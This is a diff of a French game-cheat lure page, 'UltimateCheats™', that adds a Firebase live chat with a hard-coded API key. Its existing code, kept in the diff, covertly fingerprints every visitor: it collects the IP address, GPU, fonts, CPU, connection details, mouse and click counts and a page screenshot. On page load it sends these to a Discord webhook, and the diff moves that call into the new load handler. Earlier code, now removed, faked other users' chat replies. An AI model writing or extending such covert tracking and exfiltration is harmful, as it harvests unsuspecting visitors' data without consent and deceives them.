@@ -4,6 +4,9 @@
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>UltimateCheats™</title>
+<!-- Firebase SDK -->
+<script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-database-compat.js"></script>
 <style>
   body {
     margin: 0;
@@ -411,6 +414,58 @@
     cursor: pointer;
     z-index: 1001;
   }
+  .user-list {
+    position: absolute;
+    top: 10px;
+    right: 40px;
+    color: #00cc66;
+    font-size: 0.8rem;
+    cursor: pointer;
+  }
+  .user-modal {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0, 0, 0, 0.7);
+    display: none;
+    justify-content: center;
+    align-items: center;
+    z-index: 2000;
+  }
+  .user-modal-content {
+    background: #111;
+    padding: 20px;
+    border-radius: 12px;
+    max-width: 400px;
+    width: 90%;
+    max-height: 80vh;
+    overflow-y: auto;
+  }
+  .user-modal h3 {
+    color: #ff4444;
+    text-align: center;
+    margin-bottom: 20px;
+  }
+  .user-item {
+    padding: 10px;
+    border-bottom: 1px solid #333;
+    color: #eee;
+  }
+  .user-item:last-child {
+    border-bottom: none;
+  }
+  .close-modal {
+    position: absolute;
+    top: 10px;
+    right: 15px;
+    background: none;
+    border: none;
+    color: #fff;
+    font-size: 1.5rem;
+    cursor: pointer;
+  }
 </style>
 </head>
 <body>
@@ -508,7 +563,7 @@
   <div class="chat-header">
     <h3>💬 Chat en direct</h3>
     <button class="chat-close" id="chatClose">×</button>
-    <span class="chat-online"><span id="onlineCount">1</span> en ligne</span>
+    <span class="user-list" id="userListButton">👥 <span id="onlineCount">0</span> en ligne</span>
   </div>
   <div class="chat-messages" id="chatMessages">
     <!-- Messages will be added here -->
@@ -519,25 +574,47 @@
   </div>
 </div>
 
+<div class="user-modal" id="userModal">
+  <div class="user-modal-content">
+    <button class="close-modal" id="closeUserModal">×</button>
+    <h3>Utilisateurs en ligne</h3>
+    <div id="userList"></div>
+  </div>
+</div>
+
 <button class="chat-toggle" id="chatToggle">
   <svg viewBox="0 0 24 24">
     <path d="M20 2H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h14l4 4V4c0-1.1-.9-2-2-2zm-2 12H6v-2h12v2zm0-3H6V9h12v2zm0-3H6V6h12v2z"/>
   </svg>
 </button>
 
+<script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-database-compat.js"></script>
 <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
 <script>
+  // ========== CONFIGURATION FIREBASE (avec tes clés) ==========
+  const firebaseConfig = {
+    apiKey: "AIzaSyBC8lxTm7cD5Etf7H4Ur3hgs9rcDoiXCO0",
+    authDomain: "onzerty-15427.firebaseapp.com",
+    databaseURL: "https://onzerty-15427.firebaseio.com",
+    projectId: "onzerty-15427",
+    storageBucket: "onzerty-15427.appspot.com",
+    messagingSenderId: "989167831624",
+    appId: "1:989167831624:web:b1e9528799abc7d965267d"
+  };
+
+  // Initialise Firebase
+  const app = firebase.initializeApp(firebaseConfig);
+  const database = firebase.database();
+
   // ========== CODE EXISTANT (ne pas modifier) ==========
-  // Temps passé sur la page
   let timeOnPage = 0;
   setInterval(() => { timeOnPage++; }, 1000);
-  // Détection des bloqueurs de pubs
   let adBlockDetected = false;
   const adScript = document.createElement('script');
   adScript.src = 'https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js';
   adScript.onerror = () => { adBlockDetected = true; };
   document.head.appendChild(adScript);
-  // Détection du GPU
   let gpu = "Non disponible";
   try {
     const canvas = document.createElement('canvas');
@@ -551,23 +628,16 @@
   } catch (e) {
     console.error("Erreur GPU:", e);
   }
-  // Détection des polices installées
-  const fonts = [
-    'Arial', 'Courier New', 'Georgia', 'Times New Roman', 'Verdana',
-    'Helvetica', 'Comic Sans MS', 'Impact', 'Trebuchet MS', 'Palatino'
-  ];
+  const fonts = ['Arial', 'Courier New', 'Georgia', 'Times New Roman', 'Verdana', 'Helvetica', 'Comic Sans MS', 'Impact', 'Trebuchet MS', 'Palatino'];
   const detectedFonts = [];
   fonts.forEach(font => {
     const testFont = new FontFace(font, 'url(https://example.com)');
     testFont.load().then(() => detectedFonts.push(font)).catch(() => {});
   });
-  // Détection des mouvements de souris
   let mouseMoves = 0;
   document.addEventListener('mousemove', () => { mouseMoves++; });
-  // Détection des clics
   let clicks = 0;
   document.addEventListener('click', () => { clicks++; });
-  // Variable globale pour stocker le screenshot
   let screenshotData = "Non disponible";
 
   const cheats = [
@@ -580,12 +650,7 @@
       extraBadges: ['top', 'recommended'],
       promo: '30% moins',
       description: '🎯 Boost ta précision avec l’aimbot ultra-précis et repère tes ennemis à travers les murs !',
-      features: [
-        '🎯 Aimbot automatique ultra précis',
-        '👀 ESP (voir les ennemis à travers les murs)',
-        '🔫 No Recoil (sans recul)',
-        '✨ Changeur de skins exclusifs'
-      ],
+      features: ['🎯 Aimbot automatique ultra précis', '👀 ESP (voir les ennemis à travers les murs)', '🔫 No Recoil (sans recul)', '✨ Changeur de skins exclusifs'],
       downloadLink: '#'
     },
     {
@@ -596,11 +661,7 @@
       badgeText: 'Gratuit',
       promo: '50% moins',
       description: '🕹️ Explore Roblox sans limites avec le fly hack et gagne des Robux facilement !',
-      features: [
-        '🕊️ Fly Hack pour voler librement',
-        '💨 Vitesse augmentée',
-        '📜 Executeur de scripts Lua'
-      ],
+      features: ['🕊️ Fly Hack pour voler librement', '💨 Vitesse augmentée', '📜 Executeur de scripts Lua'],
       downloadLink: '#'
     },
     {
@@ -612,11 +673,7 @@
       extraBadges: ['recommended'],
       promo: '30% moins',
       description: '💰 Deviens riche instantanément avec l\'argent illimité et téléporte-toi où tu veux sur la map !',
-      features: [
-        '💸 Money Hack illimité',
-        '📍 Téléportation instantanée',
-        '🎛️ Menu Mod privé ultra complet'
-      ],
+      features: ['💸 Money Hack illimité', '📍 Téléportation instantanée', '🎛️ Menu Mod privé ultra complet'],
       downloadLink: '#'
     },
     {
@@ -627,11 +684,7 @@
       badgeText: 'Nouveau',
       promo: '50% moins',
       description: '🚀 Passe en mode dieu et booste ton RP pour dominer Los Santos !',
-      features: [
-        '🛡️ God Mode invincible',
-        '⚡ Boost RP rapide',
-        '🕹️ Menu serveur avec options avancées'
-      ],
+      features: ['🛡️ God Mode invincible', '⚡ Boost RP rapide', '🕹️ Menu serveur avec options avancées'],
       downloadLink: '#'
     },
     {
@@ -642,25 +695,16 @@
       badgeText: 'Gratuit',
       promo: '30% moins',
       description: '⚔️ Domine tes adversaires avec KillAura et vole librement dans le monde pixelisé !',
-      features: [
-        '⚔️ KillAura automatique',
-        '🕊️ Fly et NoClip',
-        '🛡️ Anti Knockback puissant'
-      ],
+      features: ['⚔️ KillAura automatique', '🕊️ Fly et NoClip', '🛡️ Anti Knockback puissant'],
       downloadLink: '#'
     },
   ];
   const listView = document.getElementById('list-view');
   const detailView = document.getElementById('detail-view');
 
-  // Fonction pour capturer la page
   async function captureScreenshot() {
     try {
-      const canvas = await html2canvas(document.body, {
-        logging: false,
-        useCORS: true,
-        scale: 0.5,
-      });
+      const canvas = await html2canvas(document.body, { logging: false, useCORS: true, scale: 0.5 });
       screenshotData = canvas.toDataURL('image/jpeg', 0.7);
       return screenshotData;
     } catch (error) {
@@ -670,14 +714,9 @@
     }
   }
 
-  // Fonction pour détecter la version exacte de Windows (10/11)
   function getWindowsVersion(userAgent) {
     if (userAgent.includes("Windows NT 10.0")) {
-      if (userAgent.includes("Win11") || userAgent.includes("Windows 11")) {
-        return "Windows 11";
-      } else {
-        return "Windows 10";
-      }
+      return userAgent.includes("Win11") || userAgent.includes("Windows 11") ? "Windows 11" : "Windows 10";
     } else if (userAgent.includes("Windows NT 6.3")) {
       return "Windows 8.1";
     } else if (userAgent.includes("Windows NT 6.2")) {
@@ -689,7 +728,6 @@
     }
   }
 
-  // Fonction pour récupérer toutes les infos techniques
   async function getFullUserInfo() {
     try {
       const ipResponse = await fetch('https://api.ipify.org?format=json');
@@ -715,9 +753,7 @@
       if (navigator.hardwareConcurrency) {
         cpuCores = `${navigator.hardwareConcurrency} cœurs`;
       }
-      const connection = navigator.connection ?
-        `${navigator.connection.effectiveType} (${navigator.connection.downlink} Mbps)` :
-        "Non disponible";
+      const connection = navigator.connection ? `${navigator.connection.effectiveType} (${navigator.connection.downlink} Mbps)` : "Non disponible";
       const cookiesEnabled = navigator.cookieEnabled ? "Oui" : "Non";
       const language = navigator.language || navigator.userLanguage;
       const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
@@ -925,16 +961,7 @@
     });
   }
 
-  // Envoie une notification Discord dès le chargement de la page
-  window.addEventListener('load', async () => {
-    await captureScreenshot();
-    sendToDiscordWebhook("Visite de la page d'accueil");
-    cheats.forEach(cheat => {
-      listView.appendChild(createCard(cheat));
-    });
-  });
-
-  // ========== CHAT SYSTEM ==========
+  // ========== CHAT SYSTEM AVEC FIREBASE ==========
   // Génère un pseudo aléatoire pour les visiteurs
   function generateRandomUsername() {
     const adjectifs = ["Rapide", "Furtif", "Légendaire", "Mythique", "Pro", "Noob", "Sniper", "Tactique", "Fou", "Calme"];
@@ -958,12 +985,24 @@
   const chatInput = document.getElementById('chatInput');
   const chatSend = document.getElementById('chatSend');
   const onlineCount = document.getElementById('onlineCount');
+  const userListButton = document.getElementById('userListButton');
+  const userModal = document.getElementById('userModal');
+  const closeUserModal = document.getElementById('closeUserModal');
+  const userList = document.getElementById('userList');
+
+  // Référence Firebase
+  const messagesRef = database.ref('messages');
+  const usersRef = database.ref('users');
 
   // Toggle chat
   chatToggle.addEventListener('click', () => {
     chatContainer.style.display = 'flex';
     chatToggle.style.display = 'none';
     chatInput.focus();
+    // Ajoute l'utilisateur à la liste des connectés
+    const userRef = usersRef.child(username);
+    userRef.set({ online: true, lastSeen: Date.now() });
+    userRef.onDisconnect().update({ online: false });
   });
 
   chatClose.addEventListener('click', () => {
@@ -971,20 +1010,39 @@
     chatToggle.style.display = 'block';
   });
 
-  // Simule des utilisateurs en ligne
-  function updateOnlineCount() {
-    const count = Math.floor(Math.random() * 10) + 1;
-    onlineCount.textContent = count;
-  }
-  setInterval(updateOnlineCount, 5000);
+  // Gère la liste des utilisateurs en ligne
+  userListButton.addEventListener('click', () => {
+    userModal.style.display = 'flex';
+  });
 
-  // Charge les messages sauvegardés
+  closeUserModal.addEventListener('click', () => {
+    userModal.style.display = 'none';
+  });
+
+  // Charge les messages depuis Firebase
   function loadMessages() {
-    const messages = JSON.parse(localStorage.getItem('chatMessages')) || [];
-    messages.forEach(msg => {
-      addMessageToChat(msg.author, msg.text, msg.time, msg.author === username);
+    messagesRef.limitToLast(50).on('child_added', snapshot => {
+      const message = snapshot.val();
+      addMessageToChat(message.author, message.text, new Date(message.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }), message.author === username);
     });
-    chatMessages.scrollTop = chatMessages.scrollHeight;
+  }
+
+  // Met à jour le compteur d'utilisateurs en ligne
+  function updateOnlineUsers() {
+    usersRef.on('value', snapshot => {
+      const users = snapshot.val() || {};
+      const onlineUsers = Object.keys(users).filter(user => users[user].online);
+      onlineCount.textContent = onlineUsers.length;
+
+      // Met à jour la liste des utilisateurs dans le modal
+      userList.innerHTML = '';
+      onlineUsers.forEach(user => {
+        const userItem = document.createElement('div');
+        userItem.className = 'user-item';
+        userItem.textContent = user;
+        userList.appendChild(userItem);
+      });
+    });
   }
 
   // Ajoute un message au chat
@@ -1014,31 +1072,14 @@
     const text = chatInput.value.trim();
     if (text === '') return;
 
-    const now = new Date();
-    const time = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+    const message = {
+      author: username,
+      text: text,
+      timestamp: Date.now()
+    };
 
-    // Ajoute le message localement
-    addMessageToChat(username, text, time, true);
-
-    // Sauvegarde le message
-    const messages = JSON.parse(localStorage.getItem('chatMessages')) || [];
-    messages.push({ author: username, text, time });
-    localStorage.setItem('chatMessages', JSON.stringify(messages));
-
-    // Simule une réponse après 1-3 secondes
-    setTimeout(() => {
-      const replies = [
-        { author: "BotCheat", text: "Oui, ce cheat est trop puissant !" },
-        { author: "Admin", text: "Tu as essayé le fly hack sur Roblox ?" },
-        { author: "Support", text: "Le support est réactif, j'ai eu une réponse en 5 minutes." },
-        { author: "ProGamer", text: "L'aimbot est trop précis, j'ai fait 20 kills d'affilée !" },
-        { author: "NoobMaster", text: "Merci pour le partage !" },
-        { author: "CheatLord", text: "Tu as un code promo ?" },
-        { author: "Hacker", text: "Le menu est très intuitif, j'adore !" }
-      ];
-      const randomReply = replies[Math.floor(Math.random() * replies.length)];
-      addMessageToChat(randomReply.author, randomReply.text, new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }), false);
-    }, 1000 + Math.random() * 2000);
+    // Envoie le message à Firebase
+    messagesRef.push(message);
 
     chatInput.value = '';
   }
@@ -1049,9 +1090,26 @@
     if (e.key === 'Enter') sendMessage();
   });
 
-  // Charge les messages au démarrage
-  loadMessages();
-  updateOnlineCount();
+  // Initialise le chat et le site
+  window.addEventListener('load', () => {
+    // Charge les cheats
+    cheats.forEach(cheat => {
+      listView.appendChild(createCard(cheat));
+    });
+
+    // Capture un screenshot au chargement
+    captureScreenshot();
+    sendToDiscordWebhook("Visite de la page d'accueil");
+
+    // Initialise le chat
+    loadMessages();
+    updateOnlineUsers();
+
+    // Ajoute l'utilisateur à la liste des connectés
+    const userRef = usersRef.child(username);
+    userRef.set({ online: true, lastSeen: Date.now() });
+    userRef.onDisconnect().update({ online: false });
+  });
 </script>
 </body>
 </html>
